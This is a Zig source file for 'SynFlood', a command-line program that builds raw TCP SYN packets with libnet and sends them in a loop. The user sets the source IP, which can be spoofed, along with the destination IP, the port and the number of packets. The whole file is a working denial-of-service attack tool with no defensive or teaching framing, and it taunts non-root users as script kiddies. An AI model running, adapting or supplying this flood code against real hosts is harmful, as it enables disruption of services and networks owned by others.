const VERSION = "3.0.0";
const std = @import("std");
const File = std.fs.File;
const Writer = std.Io.Writer;
const c_stdlib = @cImport(@cInclude("stdlib.h"));
const c_stdio = @cImport(@cInclude("stdio.h"));
const c_unistd = @cImport(@cInclude("unistd.h"));
const c_libnet = @cImport(@cInclude("libnet.h"));
const getuid = c_unistd.getuid;
const exit = c_stdlib.exit;
const eql = std.mem.eql;
const copyForwards = std.mem.copyForwards;
const zeroes = std.mem.zeroes;
const parseInt = std.fmt.parseInt;

extern fn libnet_get_prand(prand_type: c_int) c_uint;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const allocator = gpa.allocator();
    defer _ = gpa.deinit();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    var args_iter = try std.process.argsWithAllocator(allocator);
    defer args_iter.deinit();
    _ = args_iter.next();

    var stdout_buffer: [1024]u8 = undefined;
    var stdout_writer = File.stdout().writer(&stdout_buffer);
    const stdout = &stdout_writer.interface;

    var stderr_buffer: [1024]u8 = undefined;
    var stderr_writer = File.stderr().writer(&stderr_buffer);
    const stderr = &stderr_writer.interface;

    try stdout.print("SynFlood " ++ VERSION ++ "\n", .{});
    try stdout.print("Copyright (C) 2010 Christian Mayer <https://fox21.at>\n", .{});
    try stdout.print("{s}\n", .{c_libnet.libnet_version()});
    try stdout.flush();

    if (args.len == 1) {
        try print_help(stdout);
        return;
    }

    var source_ip: [16]u8 = zeroes([16]u8);
    var source_ip_s: []u8 = undefined;
    var destination_ip: [16]u8 = zeroes([16]u8);
    var destination_ip_s: []u8 = undefined;
    var destination_port: u16 = 0;
    var connections: usize = 1;
    while (args_iter.next()) |arg| {
        if (eql(u8, arg, "-h") or eql(u8, arg, "--help")) {
            try print_help(stdout);
            return;
        } else if (eql(u8, arg, "-s")) {
            if (args_iter.next()) |next| {
                copyForwards(u8, &source_ip, next);
                source_ip_s = source_ip[0..next.len];
            }
        } else if (eql(u8, arg, "-d")) {
            if (args_iter.next()) |next| {
                copyForwards(u8, &destination_ip, next);
                destination_ip_s = destination_ip[0..next.len];
            }
        } else if (eql(u8, arg, "-p")) {
            if (args_iter.next()) |next| {
                destination_port = try parseInt(u16, next, 10);
            }
        } else if (eql(u8, arg, "-c")) {
            if (args_iter.next()) |next| {
                connections = try parseInt(u16, next, 10);
            }
        }
    }

    if (getuid() != 0) {
        try stderr.print("ERROR: You are not root, script kiddie.\n", .{});
        exit(1);
    }

    try stdout.print("source ip: {s}\n", .{source_ip_s});
    try stdout.print("destination ip: {s}\n", .{destination_ip_s});
    try stdout.print("destination port: {d}\n", .{destination_port});
    try stdout.print("connections: {d}\n", .{connections});
    try stdout.flush();

    var errbuf: [c_libnet.LIBNET_ERRBUF_SIZE]u8 = undefined;
    const net = c_libnet.libnet_init(c_libnet.LIBNET_RAW4, null, &errbuf[0]);
    if (net == null) {
        std.debug.print("libnet_init error: {s}\n", .{errbuf});
        return;
    }

    const src_ip = c_libnet.libnet_name2addr4(net, source_ip_s.ptr, c_libnet.LIBNET_RESOLVE);

    const dest_ip = c_libnet.libnet_name2addr4(net, destination_ip_s.ptr, c_libnet.LIBNET_RESOLVE);

    var ipv4: c_libnet.libnet_ptag_t = 0;
    var tcp: c_libnet.libnet_ptag_t = 0;
    var sock_written: c_int = 0;

    for (0..connections) |c| {
        try stdout.print("connection: {d} ... ", .{c});
        try stdout.flush();

        const src_port: u16 = @intCast(libnet_get_prand(c_libnet.LIBNET_PRu16));
        const src_seq = libnet_get_prand(c_libnet.LIBNET_PRu16);

        tcp = c_libnet.libnet_build_tcp(src_port, // src port
            destination_port, // dst port
            src_seq, // seq
            0, // ack
            c_libnet.TH_SYN, // control
            65535, // window
            0, // checksum
            0, // urgent
            c_libnet.LIBNET_TCP_H, // header len
            null, // payload
            0, // payload size
            net, tcp // ptag
        );
        if (tcp == -1) {
            try stderr.print("\nERROR: libnet_build_tcp: {s}\n", .{c_libnet.libnet_geterror(net)});
            try stderr.flush();
        }

        const ip_id: u16 = @intCast(libnet_get_prand(c_libnet.LIBNET_PRu16));
        ipv4 = c_libnet.libnet_build_ipv4(c_libnet.LIBNET_IPV4_H, // len
            0, // tos
            ip_id, // ip id
            c_libnet.IP_DF, // frag
            255, // ttl
            c_libnet.IPPROTO_TCP, // upper layer protocol
            0, // checksum
            src_ip, // src ip
            dest_ip, // dst ip
            null, // payload
            0, // payload size
            net, ipv4);
        if (ipv4 == -1) {
            try stderr.print("\nERROR: libnet_build_ipv4: {s}\n", .{c_libnet.libnet_geterror(net)});
            try stderr.flush();
        }

        sock_written = c_libnet.libnet_write(net);
        if (sock_written == -1) {
            try stderr.print("\nERROR: libnet_write: {s}\n", .{c_libnet.libnet_geterror(net)});
            try stderr.flush();
        }
        try stdout.print("socket written: {d}\n", .{sock_written});
        try stdout.flush();
    }
}

fn print_help(stdout: *Writer) !void {
    const help =
        \\Usage: synflood [-h|--help] -s <IP> -d <IP> -p <PORT> [-c <NUM>]
        \\
        \\Options:
        \\-h, --help         Print this help.
        \\-s <IP>            Source IP-address.
        \\-d <IP>            Destination IP-address.
        \\-p <PORT>          Destination port.
        \\-c <NUM>           Number of connections.
    ;
    try stdout.print(help ++ "\n", .{});
    try stdout.flush();
}
